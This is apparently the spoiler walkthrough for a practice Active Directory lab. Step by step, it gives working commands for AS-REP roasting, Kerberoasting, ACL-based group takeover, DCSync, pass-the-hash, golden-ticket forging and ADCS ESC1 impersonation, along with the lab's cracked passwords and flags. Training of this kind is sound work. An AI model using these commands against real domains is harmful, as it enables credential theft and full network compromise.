# Walkthrough — the intended path

This is the reference solution for `vuln.local`. It assumes you are on the
Linux **pivot** (`10.10.10.5`) and that the lab was built with `make all`.

> Spoiler warning: this document gives away every step and flag. If you want to
> practise blind, stop here and only come back when stuck.

All commands use tooling that the pivot tries to install at build time
(`impacket`, `certipy-ad`, `netexec`, `bloodhound-python`). If a tool is
missing, install it into the venv: `source /opt/offsec-venv/bin/activate`.

Convenience variables used throughout:

```bash
DC=10.10.10.10
DCHOST=dc01.vuln.local
DOMAIN=vuln.local
SRV=10.10.10.20
```

---

## Stage 0 — Foothold (flag: `foothold`)

The pivot is your beachhead. Someone left handover notes behind.

```bash
cat ~/notes/creds.txt
```

You get the first flag and a working low-privilege domain credential:

```
username : helpdesk
password : Helpdesk#123
```

Validate it and confirm the domain is reachable:

```bash
netexec smb $DC -u helpdesk -p 'Helpdesk#123'
# or: nxc / crackmapexec
```

Enumerate users so you have targets for roasting:

```bash
netexec smb $DC -u helpdesk -p 'Helpdesk#123' --users
# Optional full graph:
bloodhound-python -d $DOMAIN -u helpdesk -p 'Helpdesk#123' -ns $DC -c All --zip
```

---

## Stage 1b — AS-REP Roasting (flag: `asrep`)  *(warm-up)*

`svc_backup` has Kerberos pre-authentication disabled, so you can request its
AS-REP without any password and crack it offline.

```bash
# You can find no-preauth users with creds, or spray blind:
GetNPUsers.py $DOMAIN/ -usersfile <(echo svc_backup) -no-pass -dc-ip $DC -format hashcat -outputfile asrep.hash
# with the helpdesk creds you can enumerate them properly:
GetNPUsers.py $DOMAIN/helpdesk:'Helpdesk#123' -request -dc-ip $DC -format hashcat -outputfile asrep.hash

hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
# -> svc_backup : Backup2023
```

Collect the flag from the account's private share:

```bash
netexec smb $SRV -u svc_backup -p 'Backup2023' --shares
smbclient "//$SRV/backups$" -U "vuln.local\svc_backup%Backup2023" -c 'get flag.txt -'
```

The note there points you at the SPN path below.

---

## Stage 1 — Kerberoasting (flag: `kerberoast`)

`svc_mssql` has SPNs registered, so any authenticated user can request a
service ticket and crack the account's weak password offline.

```bash
GetUserSPNs.py $DOMAIN/helpdesk:'Helpdesk#123' -dc-ip $DC -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
# -> svc_mssql : Summer2024
```

Grab the loot flag from svc_mssql's share:

```bash
smbclient "//$SRV/mssql_backups$" -U "vuln.local\svc_mssql%Summer2024" -c 'get flag.txt -'
```

The hint tells you svc_mssql has **GenericAll** over the `IT Admins` group.

---

## Stage 2 — ACL abuse: group takeover (flag: `acl_abuse`)

Confirm the ACL (BloodHound shows this as `GenericAll` on the group), then abuse
it: add a principal you control to `IT Admins`.

```bash
# You control svc_mssql. Add svc_mssql itself to IT Admins using its GenericAll:
net rpc group addmem "IT Admins" "svc_mssql" \
    -U "vuln.local/svc_mssql%Summer2024" -S $DCHOST
# (Alternatively, from Windows: Add-ADGroupMember -Identity "IT Admins" -Members svc_mssql)
```

You are now a member of `IT Admins`. Read its flag:

```bash
smbclient "//$SRV/itadmin$" -U "vuln.local\svc_mssql%Summer2024" -c 'get flag.txt -'
```

The hint: `IT Admins` holds **DS-Replication-Get-Changes[-All]** on the domain —
i.e. DCSync rights.

---

## Stage 3 — DCSync → domain compromise (flag: `dcsync`)

As a member of `IT Admins`, replicate secrets straight from the DC.

```bash
secretsdump.py "vuln.local/svc_mssql:Summer2024@$DC" -just-dc-user krbtgt
secretsdump.py "vuln.local/svc_mssql:Summer2024@$DC" -just-dc-user Administrator
```

You now hold the `krbtgt` hash and the Administrator NT hash. Authenticate as a
Domain Admin (pass-the-hash) and read the final flag from the DC:

```bash
# Administrator hash from the dump above:
netexec smb $DC -u Administrator -H <ADMIN_NT_HASH>
smbclient "//$DC/C\$" -U "vuln.local\Administrator" --pw-nt-hash <ADMIN_NT_HASH> \
    -c 'get Flags\domain_pwned.txt -'
```

Optional flourish — forge a golden ticket with the `krbtgt` hash:

```bash
ticketer.py -nthash <KRBTGT_NT_HASH> -domain-sid <SID> -domain $DOMAIN Administrator
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass vuln.local/Administrator@$DCHOST
```

**Domain compromised.** That is the end of Chain 1.

---

## Bonus — ADCS ESC1 (flag: `adcs_esc1`)

An independent path to Domain Admin via the misconfigured certificate template
`VulnUserESC1`. Any Domain User can enrol and supply an arbitrary SAN.

```bash
# 1) Find vulnerable templates
certipy-ad find -u helpdesk@$DOMAIN -p 'Helpdesk#123' -dc-ip $DC -vulnerable -stdout
#    -> VulnUserESC1 flagged ESC1

# 2) Request a cert for the template, impersonating the Administrator via SAN
certipy-ad req -u helpdesk@$DOMAIN -p 'Helpdesk#123' -dc-ip $DC \
    -ca VULN-Root-CA -template VulnUserESC1 -upn Administrator@$DOMAIN
#    -> administrator.pfx

# 3) Authenticate with the cert to recover the Administrator TGT / NT hash
certipy-ad auth -pfx administrator.pfx -dc-ip $DC
```

With the Administrator hash you again read the DA-only flag:

```bash
smbclient "//$SRV/C\$" -U "vuln.local\Administrator" --pw-nt-hash <ADMIN_NT_HASH> \
    -c 'get Flags\adcs_esc1.txt -'
```

---

## Flag checklist

| # | Flag key    | Stage                         | Gate |
|---|-------------|-------------------------------|------|
| 0 | `foothold`  | Pivot notes                   | any pivot user |
| 1b| `asrep`     | AS-REP roast svc_backup       | crack `Backup2023` |
| 1 | `kerberoast`| Kerberoast svc_mssql          | crack `Summer2024` |
| 2 | `acl_abuse` | GenericAll → join `IT Admins` | group membership |
| 3 | `dcsync`    | DCSync via `IT Admins` rights | Domain Admin |
| ★ | `adcs_esc1` | ADCS ESC1 SAN impersonation   | Domain Admin (cert) |

Run `make flags` on the control node for the same map with the live flag values.
